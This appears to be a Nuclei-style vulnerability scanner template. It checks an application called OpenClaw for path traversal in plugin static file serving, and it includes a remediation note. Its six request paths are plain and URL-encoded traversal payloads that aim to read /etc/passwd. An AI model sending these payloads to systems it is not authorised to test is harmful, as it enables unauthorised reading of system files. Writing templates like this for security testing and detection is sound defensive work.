http:
- matchers:
  - status:
    - 200
    type: status
  - condition: or
    part: body
    type: word
    words:
    - 'root:'
    - /bin/bash
    - /bin/sh
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/__openclaw/plugins/../../../etc/passwd'
  - '{{BaseURL}}/__openclaw__/plugins/../../../etc/passwd'
  - '{{BaseURL}}/__openclaw/plugins/..%2F..%2F..%2Fetc%2Fpasswd'
  - '{{BaseURL}}/__openclaw__/plugins/..%2F..%2F..%2Fetc%2Fpasswd'
  - '{{BaseURL}}/__openclaw/plugins/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
  - '{{BaseURL}}/__openclaw__/plugins/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
id: openclaw-plugin-path-traversal
info:
  author: lobster-guard
  classification:
    cwe-id: CWE-22
  description: Tests for path traversal via plugin static file serving
  metadata:
    max-request: 6
    product: openclaw
    vendor: openclaw
    verified: false
  name: OpenClaw Plugin Path Traversal
  remediation: Sanitize file paths in plugin static file handler. Reject requests
    containing .. or URL-encoded traversal sequences.
  severity: high
  tags: openclaw,plugin,traversal,lfi
